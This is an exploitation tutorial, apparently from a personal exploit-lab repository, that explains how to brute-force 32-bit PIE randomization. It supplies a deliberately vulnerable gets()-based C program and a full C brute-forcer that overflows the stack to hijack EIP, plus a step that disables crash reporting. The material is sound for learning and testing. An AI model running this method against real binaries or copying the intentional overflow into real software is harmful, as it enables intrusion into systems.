# Exploitation
## Brute forcing PIE In 32 bits
### Insight
For now everything we did was quite good, but most of the time every ROP we performed and else except partial address overwrite was based on the fact that PIE is always enabled.  
Let me tell you right now, in modern systems, PIE is almost omnipresent, and we have to find a way to go against it.  
We've already covered Partial Address Overwrite, and it works, but it has huge limitations :
- First if we're doing it from a buffer overflow which is coming from libc functions like `gets`, `scanf`, `strcpy` it may not work, unless there's a null byte after the bytes we overwrite in memory, because this functions would set null byte to the byte after our input.  
- Also, this works when we're doing a single address overwrite, but what if we're doing a Return Oriented Programming, we'll have to do this for every gadget, but the offset between these gadgets might be huge, so doing partial address overwrite won't work.  

We also saw a particular exploit when fork is used in a loop, and it works great, it can also defeat Stack Smashing Protection, but again, it is really a special case, not every program uses fork.  

So for this whole article, we'll be exploiting a 32 bits program, and in this article we won't see a magical technique on how to bypass PIE because the two techniques aforementionned are the only ones i know. But in the other hand, we'll take a look at what it takes to brute-force PIE randomness, what we'll apply in this article is extremely reasonnable, the brute force should be really quick and should take at most like 1 minute or really less, after like 16000 executions of the program, we should guess the correct thing at least one time.  

So, how do you really do ? Well first know that it's in 32 bits, it's not that it won't work in 64 bits but it's hugely easier in 32 bits, since there's less nibbles (4 bits) we'll have to guess.  

First let's see how **EXACTLY** PIE works, but let's first see in an abstract way.  
See : `../../Explaination/Position-Independant-Executable.md` : https://github.com/TheCrazzXz/Exploits-Lab/blob/main/App-sys/how-do-i/Explaination/Position-Independant-Executable.md  

So we assume we're in 32 bits for this, then at each execution three random nibbles will be generated (from 0 to 4095) and we have to find them, we of course won't always hit them, so let's try to guess them at each execution.  
Here's the program that we'll be exploiting :
```c
#include <stdio.h>

void win()
{
    puts("YOU WON\n");
}

void vuln()
{
    char buffer[64];

    gets(buffer);
}

int main(void)
{
    vuln();
    printf("you lose\n");
}
```
Really simple.
To compile it : `gcc <src>.c -o prog -fno-stack-protector -fPIE -m32`  
You should enable ASLR (Address Space Layout Randomization) : `echo "2" >/proc/sys/kernel/randomize_va_space` 
Now we can't use a regular exploit where we just replace EIP backup with the address of the win function, so let's first get it's offset :
```
gdb
(gdb) file prog
(gdb) x win
```
```
0x11ad <win>:   0x53e58955
```
May differ for you.
Here are the steps for the exploit :
In a loop :
- We generate 3 random nibbles :
```c
/* randint is a function that generates a random integer between min and max */
uint16_t off = randint(0, 4095);
```
We then calculate the guessed program base based on these 3 nibbles :
```c
guessed_program_base = 0x56000000 | (off << (3 * 4)); 
```
Then we add the win function offset (in this case `0x11ad`) to get the win function real address if it's the correct program base :
```c
guessed_win_addr = guess_program_base + WIN_OFF;
```
If you had multiple functions or gadgets in your exploit then just add their offset to the guessed program base to get their real address if it's the correct program base.  
Then here's the payload layout :
```
[64 bytes of buffer data]
[12 bytes : padding between buffer end and EIP backup]
[GUESSED WIN FUNCTION ADDRESS (4 bytes)]
```
Keep in mind that we're in 32 bits in this case.  
Then open the target program and send payload to it.  
If we get "YOU WON" in the output, this means we won (yes that's pretty obvious).  
Here's the exploit developped in C programming language :
```c
/*
    32 bits 3-nibbles for PIE brute forcer

    Compile : gcc exploit.c -o exploit

    target program has to be compiled this way : gcc <src>.c -o prog -m32 -fPIE -fno-stack-protector

    PROTECTIONS OF TARGET PROGRAM (32 BITS) :
    ----------------
    PIE : ON
    ASLR : ON
    NX : (whatever)
    SSP : OFF
    ----------------
*/

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/wait.h>
#include <pty.h>
#include <time.h>
#include <signal.h>
#include <stdint.h>
#include <string.h>

/* set this to the offset of the win function */
#define WIN_OFF <WIN FUNCTION OFFSET> /* gdb prog ; (gdb) x win*/ 
/* random uint between min and max */
#define randint(min, max) (((rand() % (max + 1 - min)) + min))

#define timer_start(v) v = clock()
#define timer_stop(before) ((int)((clock() - before) * 1000 / CLOCKS_PER_SEC))

void funcErrExit(const char* func, int code)
{
    fprintf(stderr, "Error with function %s : ", func);
    perror(func);
    printf("\n");
    exit(code);
}


int master; /* communication pipe between the process */
ulong count = 0; /* number of total executions */
ulong wincount = 0; /* number of times the "YOU WON" message was printed */
uint32_t guess_program_base; /* current program base guess */
uint32_t guess_win_addr; /* current win address guess */

char nulbuf[64]; /* a buffer that will be intialized to 64 null bytes */ 
FILE *outputFile; /* file where information about special things happened */

clock_t start_of_program; /* timestamp where program started */
int firstOutputFileWrite = 1; /* is it the first time we would write to the outputFile */

/* handler : a function that will execute each time the opened process will receive a certain signal `signu` */
void handler(int signu)
{
    char buffer[64]; /* buffer for what we'll receive */
    memset(buffer, 0, sizeof(buffer)); /* set it completely to 64 null bytes so it matches nulbuf[64] */

    read(master, buffer, sizeof(buffer)); /* read from the program stdout */

    if(memcmp(buffer, nulbuf, 64) == 0) /* is the buffer still completely NULL after the read from stdout*/
    {
        /* nothing special happened : trivial crash */
    }
    else /* someone was written to stdout... interesting... */
    {
        outputFile = fopen("exploit_output", "a"); /* open the output file in add mode */
        
        /* get current time and date */
        time_t t = time(NULL);
        struct tm tm = *localtime(&t);

        /* write in the output file information about the start of the exploit */
        if(firstOutputFileWrite)
        {
            firstOutputFileWrite = 0;
            fprintf(outputFile, "PROGRAM AT : %d-%02d-%02d %02d:%02d:%02d\n", tm.tm_year + 1900, tm.tm_mon + 1, tm.tm_mday, tm.tm_hour, tm.tm_min, tm.tm_sec);
        }

        fprintf(outputFile, "---------------------------------------------------------\nSPECIAL at execution %lu at %ds after the start of the program [GUESSED PROGRAM BASE : 0x%x | GUESSES WIN (=PROGRAM BASE + 0x%x):] : 0x%x\n", count, timer_stop(start_of_program) / 1000, guess_program_base, WIN_OFF, guess_win_addr);
        
        /* OMG DID WE H4X00RED 1337++ suPer hxxxxx something ???????????????????????? */
        printf("omg something has happened [PROCESS SIGNAL : %d] (maybe win ?) [GUESSED PROGRAM BASE : 0x%x | GUESSES WIN (=PROGRAM BASE + 0x%x):] : 0x%x \n", signu, guess_program_base, WIN_OFF, guess_win_addr);
        printf("output : %s\n", buffer);

        /* DID THE PROGRAM ACTUALLY SAY WE WON ????? */
        if(strstr(buffer, "YOU WON") != NULL)
        {
            /* YES !!!!!! WE ARE OFFICIALLY H4X00RS FROM THE FUTURE THAT CAN BYPASS PIE !! */
            printf("WE WON !!\n");
            wincount++; /* increase the number of wins */
            fprintf(outputFile, "It's a win [WIN NUMBER : %lu]\n", wincount);
        }
        else /* actually no... :'( */
        {
            fprintf(outputFile, "It's likely not a win...\n");
        }
        fprintf(outputFile, "---------------------------------------------------------\n");
        fclose(outputFile); /* we don't need the file anymore*/
    }
 
}




int main(void)
{
    /* SOME PARTS OF THIS CODE ARE TAKEN FROM LIVEOVERFLOW 24 BITS STACK COOKIE / STACK CANARY BRUTE FORCE  */
    ulong idx = 0;
    uint32_t org_payload[256]; /* payload before EIP BACKUP overwrite */
    memset(nulbuf, 0, 64);

    memset(org_payload, 'X', 64); /* fill the whole buffer of target */
    idx += 16; // 16 * 4 = 64
    /* padding until EIP save */
    org_payload[idx++] = 0x41414141;
    org_payload[idx++] = 0x42424242;
    org_payload[idx++] = 0x43434343;

    
    /* intialize random seed*/
    srand(time(NULL));    

    /* disable buffering for stdout*/
    setbuf(stdout, NULL);

    /* if we have a signal on the CHILD process then we execute the handler function */
    struct sigaction sigchld_action = {.sa_handler = handler, .sa_flags = SA_NOCLDWAIT};
    sigaction(SIGCHLD, &sigchld_action, NULL);

    /* timers setup... */
    timer_start(start_of_program);

    clock_t before;
    timer_start(before);

    ulong exec_per_sec = 0;

    while(1)
    {
        exec_per_sec++;
        count++;
        pid_t pid = forkpty(&master, NULL, NULL, NULL); /* duplicate current process image */

        /* disable pty terminal character re-output */
        struct termios tios;
        tcgetattr(master, &tios);
        tios.c_lflag = 0;
        tcsetattr(master, TCSANOW, &tios);

        /* catch error */
        if(pid == -1)
        {
            funcErrExit("fork", -1);
        }

        /* on success */
        if(pid == 0) /* child */
        {
            char* execv_argv[] = {"./prog", 0};
        
            execv(execv_argv[0], execv_argv); /* execute the target program */
        }
        else /* parent */
        {
            uint32_t payload[256];

            /* guess the 3 nibbles */      
            uint16_t off = randint(0, 4095);

            /* deduce guessed program base and win address from it */
            guess_program_base = 0x56000000 | (off << (3 * 4)); 
            guess_win_addr = guess_program_base + WIN_OFF;

            /* copy the first overflow and padding before EIP backup */
            memcpy(payload, org_payload, 19);
            idx = 19;
            payload[idx++] = guess_win_addr; /* overwrite EIP backup with the guessed win address*/
            payload[idx++] = 0x0a0a0a0a; /* DONT FORGET THIS : Newline characters */
            
            /* write payload to the process */
            write(master, payload, sizeof(uint32_t) * idx);

            int wait_ret;
            int status;

            /* wait for output */
            for(int i = 0 ; ; i++)
            {
                wait_ret = waitpid(pid, &status, WNOHANG);
                if(wait_ret == -1)
                {
                    break;
                }
                if(wait_ret == 0 && i == 10)
                {
                    kill(pid, SIGKILL);
                }
                nanosleep((const struct timespec[]){{0, 10000000L}}, NULL);
            }
            /* close pipe */
            close(master);
        }
        /* if one second has passed in the time, print to statistics about the program */
        if(timer_stop(before) >= 1000)
        {
            printf("./prog | %lu executions / s | total executions : %lu| Last guessed win address : 0x%x | Number of wins : %lu\n", exec_per_sec, count, guess_win_addr, wincount);
            timer_start(before);
            exec_per_sec = 0;

        }

        
    }

}
YOU SHOULD REPLACE `<WIN FUNCTION OFFSET>` by the offset of the win function (example : 0x1165)   
```
Now you can compile this : `gcc <exploit source>.c -o exploit`.  
Disable service apport because we don't want to collect any crash information about the program : `service apport stop`.  
We can run it and with 2000 executions per second, with a probability of 1 / 4096 to get it at an execution, it should work after like 50 seconds or less (or more). And you may get :
```
omg something has happened [PROCESS SIGNAL : 17] (maybe win ?) [GUESSED PROGRAM BASE : 0x565c8000 | GUESSES WIN (=PROGRAM BASE + 0x11ad):] : 0x565c91ad 
output : YOU WON
```
Thanks for reading
